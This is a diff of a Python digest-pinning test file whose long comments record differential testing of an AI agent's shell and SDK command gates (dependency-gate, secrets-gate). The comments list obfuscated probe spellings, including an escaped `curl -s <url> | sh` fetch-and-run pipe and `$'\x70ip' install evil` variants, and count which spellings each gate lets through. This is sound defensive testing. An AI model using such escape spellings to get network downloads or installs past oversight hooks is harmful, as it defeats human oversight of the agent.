+    #     mentioned: `curl -s <url> | $'\x73h'` (the SDK's
+    #     pipe-to-interpreter arm reaches this word and the shell's does not;
+    #     identical at v2.7.1, so it is not a third-spelling effect),
+    #     `pipx install\xa0evil` and `pipx install\u2028evil` (X-36a,
+    #     non-ASCII separators) and `pip install @` (X-36f).
+    #     8 IS WHAT THIS CORPUS FINDS. A census is a lower bound on the
+    #     population, which is exactly why the corpus is named here instead
+    #     of the number being quoted on its own - the failure being corrected
+    #     is a number with no corpus behind it.
+    #     >>> AND ONE OF THOSE FOUR TOLERATED ROWS IS NOT A ROW, IT IS A
+    #     >>> SHAPE CLASS, which listing it as one of four hides. The SDK's
+    #     >>> pipe-to-interpreter arm reaches an ANSI-C-quoted word at the
+    #     >>> pipe's command position and the shell's arm does not, so EVERY
+    #     >>> body that can appear inside `$'...'` is another split of the
+    #     >>> same shape - `curl -s <url> | $'\x73h'` is one instance of an
+    #     >>> unbounded family, not a member of a population of four. A
+    #     >>> 3,073-command escape sweep (six `$'...'` shapes x the escape
+    #     >>> alphabet) finds 421 splits at head on dependency-gate: 418
+    #     >>> tolerated, 3 forbidden, and 417 OF THE 418 ARE THIS ONE SHAPE.
+    #     >>> 418 of the 421 are present at v2.7.1 with identical verdicts.
+    #     >>> Backlog row X-36p. So "8" is a lower bound in the strong sense
+    #     >>> - it is 8 rows over 706, and the same defect over a corpus
+    #     >>> built to exercise the escape alphabet is 421. The corpus was
+    #     >>> named, which was the fix the third amendment made; naming the
+    #     >>> SHAPE CLASSES is the half it did not. <<<
+    #   * ALL EIGHT ARE PRESENT AT v2.7.1, byte-identically - same verdicts
+    #     and same reason strings on both trees, checked row by row.
+    #   * SPLITS INTRODUCED BY THIS BRANCH, OVER THIS 706-ROW CORPUS: 0, in
+    #     either direction. THAT IS A CLAIM ABOUT THESE 706 ROWS AND NOTHING
+    #     WIDER, and the previous wording of this bullet - "0, in either
+    #     direction. That is the claim the sentence was reaching for, and it
+    #     survives" - dropped the corpus and turned a census into a universal,
+    #     one paragraph after correcting that exact error above. IT IS FALSE
+    #     AS A UNIVERSAL. The 3,073-command escape sweep finds THREE
+    #     introduced splits this corpus does not contain, TWO OF THEM IN THE
+    #     FORBIDDEN DIRECTION (all dependency-gate, all v2.7.1 allow/allow):
+    #         $'\'\x70ip' install evil   -> shell=deny  / SDK=ALLOW
+    #         $'\x70ip\'' install evil   -> shell=deny  / SDK=ALLOW
+    #         $'\x70ip\$' install evil   -> shell=allow / SDK=DENY
+    #     Filed as backlog row X-36o, with the real-bash ground truth: bash
+    #     5.3 with a fake `pip` on PATH runs NONE of the three words (`'pip`,
+    #     `pip'`, `pip\$` - all `command not found`), so both directions are
+    #     OVER-REFUSAL and no fail-open is reachable. The mechanism is the
+    #     pre-existing lossy reduction, not the third spelling: the decoded
+    #     forms `$'\'pip' install evil` and `$'pip\$' install evil` carry
+    #     these same split verdicts at v2.7.1 AND at head, unchanged; the new
+    #     spelling only decodes `\x70` to `p` and routes the escaped payloads
+    #     into a class X-36e and X-36k already carry. Left open deliberately -
+    #     it is a reduction rewrite in the shared header, not a rider on an
+    #     X-36h part-1 fix.
+    #   * SPLITS RETIRED BY THIS BRANCH: 16 - v2.7.1 has 20 forbidden-
+    #     direction splits over this corpus and head has 4. All 16 are index
+    #     rows: 14 attached `-i`/`-f` spellings (including `-iX`, `-fX`, the
+    #     quoted, `file://` and local-path forms, and `go install -insecure`)
+    #     and the 2 `--default-index` rows. That is the index-flag half of
+    #     this entry, measured on a wider corpus than the 44 rows above.
+    #   * ALL EIGHT SPLITS ARE ON dependency-gate. secrets-gate has 0 over its
+    #     63 rows, on both trees.
+    #   * LOOSENINGS, v2.7.1 deny -> head allow: 0 on the shell and 0 on the
+    #     SDK, over all 706 rows. TIGHTENINGS: 137 shell, 153 SDK.
+    #
+    # 2. WHAT MOVED IN THE EMITTED BYTES. VERIFIED PER-FILE BEFORE
+    # RE-BASELINING: counts stable at 57 / 69 / 59, 0 added, 0 removed,
+    # 12 / 16 / 12 bodies move per fixture - the 11 / 15 / 11 hook `.sh`
+    # bodies plus `.claude/sdk_gates/gates.py`. That is the WHOLE exception
+    # measured against the v2.7.1 tag, per fixture, by per-file body digest,
+    # re-run at this amendment rather than inherited from the two before it.
+    # No steering, skill, command, agent, spec or settings body moves in any
+    # fixture. That moved set IS the complete artifact set of each
+    # fixture: with the shell transcription living in `_HOOK_HEADER`, every
+    # emitted hook carries it, so "which hooks moved" has no discriminating
+    # power here and the load-bearing measurement is the 0-added / 0-removed /
+    # counts-stable half, plus the NON-hook bodies staying put.
+    #
+    # AND THE FIRST AMENDMENT'S "the shell is byte-identical" CLAIM, which no
+    # per-file dump can check any more because the tree it compared against no
+    # longer exists, is re-established STRUCTURALLY instead: perturb the
+    # `& 0xFF` octal mask in both Python copies, and separately perturb
+    # `ANSIC_RE_SRC`'s catch-all alternative, and each moves 3 artifacts -
+    # one `gates.py` per fixture - and 0 of the 37 hook bodies. The test is
+    # known to be able to fail: perturbing the shell's own `_ansic_safe`, or
+    # `cmdpos.PARAM_DEFAULT_WINDOW` (a cmdpos constant that IS rendered into
+    # the hook, so "cmdpos does not reach the shell" would be the WRONG
+    # reason), moves all 37 hook bodies and 0 gates.py.
+    #
+    # 3. TWO RESIDUES RECORDED SO THEY ARE NOT REDISCOVERED AS DEFECTS.
+    #   (a) `\c` AND A DIGIT-LESS `\x` ARE NOT BASH-EXACT IN ANY OF THE THREE
+    #       IMPLEMENTATIONS. All three consume them as two-character units;
+    #       bash consumes a FOLLOWING character (`$'\c\x70ip'` is 0x1c then
+    #       the literal `x70ip` under bash 5.3, where all three read
+    #       `$'\cpip'`) - reproduced here against real bash and all three
+    #       implementations, 0 three-way disagreements over the shape. Review
+    #       2 measured its FREQUENCY at 92 of 4,692 bash-expanded bodies,
+    #       2.0%; that sweep is cited, not re-run.
+    #       All three AGREE, which is the contract this pair enforces, and the
+    #       direction is OVER-REFUSAL ONLY - the rewrite decodes escapes bash
+    #       leaves literal, never the reverse, and spellings are additive, so
+    #       no fail-open is reachable. Pinned as allow/allow rows beside the
+    #       unbalanced-run row in tests/test_substrate_differential.py, and in
+    #       cmdpos.ansic_decode's docstring.
+    #   (b) `cmdpos.ANSIC_SAFE` HAS THREE TRANSCRIPTIONS AND ONLY THE SDK'S
+    #       WAS PINNED BY IDENTITY. The SDK's is rendered from the constant;
+    #       the shell hand-writes it TWICE, in two notations - `_ansic_safe`'s
+    #       `''|*[!!-~]*` bracket range with its exclusion list, and a second,
+    #       independent NUMERIC encoding of the same range as `-ge 33 ... -le
+    #       126` in `_ansic_body`'s `\u`/`\U` arm. Behavioural coverage over a
+    #       vector list was the only thing holding them, and the FIRST
+    #       amendment's defect A above is the proof that this is not
+    #       sufficient. NOW PINNED STRUCTURALLY,
+    #       not merely recorded: tests/test_substrate_differential.py parses
+    #       both shell encodings out of the emitted hook and derives what they
+    #       must say from ANSIC_SAFE itself, including that ANSIC_SAFE has to
+    #       BE a contiguous range minus an exclusion list - the only shape a
+    #       bracket expression can carry. Demonstrated to fail on all five
+    #       drift mutations (narrow the cmdpos range; drop a cmdpos exclusion;
+    #       drift the shell bracket range; drop a shell exclusion; drift the
+    #       shell numeric bound) and to pass unmutated. The numeric-bound
+    #       mutation fails NOTHING ELSE IN THE SUITE - 1 failure, and it is
+    #       this pin - which is exactly the blind spot the reviewer named.
+    #
+    # 4. AND ONE CLAIM IN THIS ENTRY IS SOFTENED RATHER THAN DEFENDED: the
+    # `--index-strategy` reason string. See the qualification written beside
+    # it above and backlog row X-36m. It is shell parity, it regresses
+    # nothing, and it is still inaccurate for that one flag.
+    #
+    # WHAT THIS AMENDMENT DID NOT MOVE: no emitted byte. It is comment,
+    # test-pin and backlog work only, so the three digests below are the
+    # SECOND amendment's values, unchanged and re-verified against a fresh
+    # per-file dump rather than inherited.
+    #
+    # [freeze-exception no. 42, FOURTH AMENDMENT - THE BUDGET WAS COMPARING
+    # DIFFERENT UNITS ON THE TWO SUBSTRATES, 2026-08-05]
+    #
+    # 1. WHAT WAS WRONG. `cmdpos.RESOLVED_SPELLING_MAX` was documented as
+    # 16384 CHARACTERS and enforced with bash `${#var}` on the shell against
+    # Python `len()` on the SDK. The third amendment asserted, three
+    # paragraphs above, that those are "two implementations of how many
+    # characters is this" and that where they could differ bash counts MORE,
+    # i.e. the tolerated direction. BOTH HALVES ARE WRONG, and the reason is
+    # not in the strings - it is in the ENVIRONMENT. `${#var}` counts
+    # CHARACTERS in a UTF-8 locale and BYTES under `LC_ALL=C`, because the
+    # ambient locale is what decides whether bash decodes multibyte sequences
+    # at all. So the budget's unit was a property of the machine the hook ran
+    # on, and a substrate SPLIT sat behind an environment variable. The suite
+    # could not see it because every run inherited a UTF-8 locale; `LC_ALL=C`
+    # is what a stripped CI container and a `sudo` environment actually have.
+    #
+    # MEASURED ON THE EMITTED GATES, v2.7.1 vs the pre-amendment tree:
+    #   $'\x70ip' install evil + 8000 x `中`   (8,023 chars / 24,023 bytes)
+    #     LC_ALL=en_US.UTF-8   v2.7.1 allow/allow -> deny/deny      fine
+    #     LC_ALL=C            v2.7.1 allow/allow -> ALLOW/DENY   <- SPLIT
+    # A 120-row boundary sweep - 4 fills (ASCII, `é`, `中`, an astral emoji) x
+    # MAX-1 / MAX / MAX+1 x BOTH units (sized to the budget in code points and
+    # in bytes) x 5 locales (C, C.UTF-8, en_US.UTF-8, and tr_TR.UTF-8 +
+    # zh_CN.UTF-8 built with localedef, so a non-English UTF-8 locale is
+    # covered rather than assumed) - found 9 SPLITS on a tree carrying the
+    # pre-fix comparison, i.e. this one with ONLY the three comparison sites
+    # reverted and every other byte of this amendment in place, which is the
+    # mutation form of the same measurement.
+    # ALL NINE ARE UNDER `LC_ALL=C` WITH A MULTIBYTE FILL; an ASCII fill
+    # splits in no locale. All nine are the tolerated direction, and the
+    # forbidden one is unreachable here because bytes >= characters for valid
+    # UTF-8, so bash can never count FEWER than Python - which is the third
+    # amendment's claim, true only in the direction it happened to check.
+    #
+    # 2. THE FIX, AND WHY BYTES. The unit is now UTF-8 BYTES on all three, and
+    # it is PINNED rather than inherited: the shell counts inside `_blen`,
+    # which sets `local LC_ALL=C` for exactly one parameter expansion (scoped
+    # to that function and restored on return, so no `case` glob and no
+    # bracket range anywhere else in the hook changes behaviour), and the two
+    # Python copies count with `cmdpos.budget_len` / the SDK's `_budget_len`,
+    # which are `len(s.encode("utf-8", "surrogatepass"))` and NOT `len`.
+    # The constant is still ONE named cmdpos value rendered into both
+    # substrates - no number is hand-typed in either.
+    #   BYTES rather than characters, deliberately, for three reasons:
+    #   (a) it is the only unit bash can compute in EVERY locale. `LC_ALL=C`
+    #       is guaranteed to exist; counting CHARACTERS would require a UTF-8
+    #       locale to be INSTALLED on the machine running the hook, and a
+    #       minimal container image has none - that is the same defect moved.
+    #   (b) it is the unit the budget was MEASURED in. This is a performance
+    #       guard, every bash string operation costs O(bytes it copies), and
+    #       the rung the number came from is 16,017 BYTES.
+    #   (c) bytes >= characters, so the change can only make the spelling be
+    #       SKIPPED MORE OFTEN, never less. A skipped spelling restores the
+    #       v2.7.1 verdict exactly (`command_spellings` is monotone), so the
+    #       unit change cannot open anything v2.7.1 did not already have open
+    #       and cannot add a deny anywhere.
+    # RE-SWEPT AFTER THE FIX, on the shipping tree: the same 120 rows give
+    # 0 SPLITS and 0 rows off the byte-budget expectation, in all 5 locales.
+    # The headline row, on all three trees, both locales:
+    #   $'\x70ip' install evil + 8000 x one 3-byte character
+    #   (8,023 characters / 24,023 bytes), (shell, SDK) per tree:
+    #     en_US.UTF-8  v2.7.1 allow/allow   pre deny/deny         now allow/allow
+    #     C            v2.7.1 allow/allow   pre ALLOW/DENY split  now allow/allow
+    #   Both locales now land on v2.7.1's answer, which is what a skipped
+    #   deny-only spelling is supposed to do.
+    #
+    # 3. WHAT MOVED, AND NOTHING ELSE DID. Verdicts over the 566-row verifier
+    # corpus on both gates and both substrates, driven TWICE (ambient locale
+    # and `LC_ALL=C`) against a reconstruction of the pre-amendment tree:
+    # EXACTLY 12 rows move, which is 6 distinct commands x the 2 locale
+    # passes, and every one of them is a multibyte command at the budget
+    # boundary (`é`, `中`, emoji at MAX-1 and MAX code points). All 12 land on
+    # the v2.7.1 verdict, allow/allow. Splits over that corpus: 14 distinct at
+    # the pre-amendment tree, 8 at this one - the 6 that go are exactly the
+    # locale-manufactured budget splits, and the 8 that stay are the 8 this
+    # entry already names. Nothing else moved in either direction.
+    #   THE RECONSTRUCTION IS CHECKED, NOT TRUSTED: it reproduces all three
+    #   pre-amendment digests byte-exactly (2a48f63b… / 30150fcc… /
+    #   579f5cea…), which is what makes it the pre-amendment tree.
+    #
+    # 4. WHAT MOVED IN THE EMITTED BYTES - AND THIS AMENDMENT DOES MOVE THEM,
+    # unlike the third. Per fixture, by per-file body digest, against that
+    # same reconstruction: counts stable at 57 / 69 / 59, 0 added, 0 removed,
+    # 12 / 16 / 12 bodies move - the 11 / 15 / 11 hook `.sh` bodies plus
+    # `.claude/sdk_gates/gates.py`, the same set the SECOND amendment moved
+    # (the third moved no emitted byte at all). No steering, skill, command,
+    # agent, spec or settings body moves in any fixture. The `.sh` bodies move
+    # because `_blen` is a new function in `_HOOK_HEADER`, which every emitted
+    # hook carries; `gates.py` moves for `_budget_len` and its prelude
+    # comment. That moved set IS the complete artifact set of each fixture for
+    # a header change, so the load-bearing half of this measurement is the
+    # 0-added / 0-removed / counts-stable part plus the NON-hook bodies
+    # staying put - not "which hooks moved", which has no discriminating
+    # power when the change is in the shared header.
+    #
+    # 5. TWO BACKLOG ROWS CAME OUT OF THE SAME PASS, and neither is fixed
+    # here: X-36o (the third spelling routes ANSI-C payloads into the
+    # pre-existing lossy-reduction class - 3 introduced splits, 2 forbidden,
+    # over-refusal only, no fail-open, X-36e/X-36k class) and X-36p (the
+    # `curl <url> | $'...'` pipe shape is a split CLASS, 417 of 418 tolerated
+    # splits over a 3,073-command sweep, pre-existing at v2.7.1). Both are
+    # written into the two census bullets above rather than only into the
+    # backlog, because the bullets are where the numbers are read.
     "default":
-        "3b16ea31935843cb251794b39c8523174a42cb9601808467f56b814ef0f6d757",
+        "f60bb55664613ea51979d2b30edb4e1aeaeecbd08c2cc4df276f5095b6645338",
     #   Adversarial-review round-2 additions inside the same exception
     #   (pre-commit, same named set): loop.sh/goal-loop.sh gain the
     #   transient-path definition (no-rejected-event arm + infra_* knobs,
@@ -1476,8 +2197,37 @@ EXPECTED_DIGESTS = {
     # absence - and the local guard is a parser SELF-TEST rather than a
     # presence test, so both layers agree.
     # [freeze-exception no. 35] same two files as `default` above.
+    # [freeze-exception no. 41] ONE file, sdk_gates/gates.py. Its body digest
+    # differs from `default`'s only because the autonomous config resolves a
+    # different RESOLVED_CONFIG literal into the same module; the gate LOGIC
+    # edit is identical, and no hook body moves.
+    # [freeze-exception no. 42] SIXTEEN ARTIFACTS - measured per-file on a
+    # built install of THIS fixture, not counted from emission sites in
+    # lib/templates.py. All FIFTEEN emitted hook bodies (this fixture carries
+    # tdd-gate, eval-gate, drift-detector-loop-cooperation and
+    # iteration-summary-enforcement on top of the eleven the default install
+    # emits) plus sdk_gates/gates.py. Do not read that 15 as the 15
+    # `return _HOOK_HEADER` SITES in lib/templates.py - several of those are
+    # mode variants of one hook, the two numbers are equal here by accident,
+    # and the header change is 12 artifacts on a DEFAULT install. The
+    # transcription lives in
+    # `_HOOK_HEADER`, so a hook moves whether or not it holds an allow list -
+    # only secrets-gate and dependency-gate change BEHAVIOUR. Action count
+    # unchanged at 69, 0 added, 0 removed; no non-hook body moves.
+    # [no. 42 AMENDMENT] Re-baselined again for the two decoder findings: ONE
+    # moved body, `.claude/sdk_gates/gates.py`. Every `.sh` hook is byte-
+    # identical to the first cut - the shell arm was already right about the
+    # octal byte mask and about consuming an escaped backslash whole - and the
+    # action count is still 69.
+    # [freeze-exception no. 42, SECOND AMENDMENT] Same exception as the
+    # `default` column: `_param_default`'s shell walk is windowed and the
+    # third spelling gains a length budget. SIXTEEN moved bodies here, the 15
+    # hook `.sh` files this fixture emits plus `.claude/sdk_gates/gates.py`;
+    # 0 added, 0 removed, count still 69. The `.sh` hooks move at this
+    # amendment where they did not at the first one, because this change is
+    # in the shell transcription and every hook carries `_HOOK_HEADER`.
     "full_autonomous":
-        "d5fd88de5c65005c245a385f0bf398fd48f63489a9525296c6a16e8b3e922c57",
+        "067b824d28960e4d024ea83bd7fd330229aab24eead9a9d3f395b31428bf6db0",
     # [v2.5.0 DS-01 — new flag-on fixture] Deliberate golden ADDITION (not a
     # re-baseline): a fullstack config with design_steering_enabled: true AND
     # design_review_skill_enabled: true. Pins the three flag-gated artifact
@@ -1548,8 +2298,24 @@ EXPECTED_DIGESTS = {
     # [freeze-exception no. 26] see the note on `default` above; this fixture
     # moves 11 hook bodies for the same one-function shared-header change.
     # [freeze-exception no. 35] same two files as `default` above.
+    # [freeze-exception no. 41] ONE file, sdk_gates/gates.py; the three design
+    # artifacts are UNCHANGED (frozen twins intact) and so is
+    # dependency-gate.sh. Same body digest as `default` (the SDK module does
+    # not vary with the design-steering flags).
+    # [freeze-exception no. 42] TWELVE files, the same set as `default`: the
+    # eleven hook bodies plus sdk_gates/gates.py. The three frozen design
+    # artifacts (.claude/steering/design.md and the design-review skill and
+    # command) are UNCHANGED - verified per-file, not assumed - and the action
+    # count is unchanged at 59.
+    # [no. 42 AMENDMENT] Same single moved body as the other two fixtures,
+    # `.claude/sdk_gates/gates.py`; the three frozen design artifacts are
+    # again unchanged, verified per-file, and the count is still 59.
     "design_steering":
-        "566430e33d8968571212616ebb3a147584dd06e32c9237025c27e34c349d258c",
+        # [freeze-exception no. 42, SECOND AMENDMENT] Same exception as the
+        # `default` column. TWELVE moved bodies: the 11 hook `.sh` files plus
+        # `.claude/sdk_gates/gates.py`; 0 added, 0 removed, count still 59.
+        # The three design-steering artifacts are untouched.
+        "dcde1637baa25426145cb907fd2c8c08581d5644c867b992aa9a4c2bb824d6e9",
 }
 
 EXPECTED_ACTION_COUNTS = {
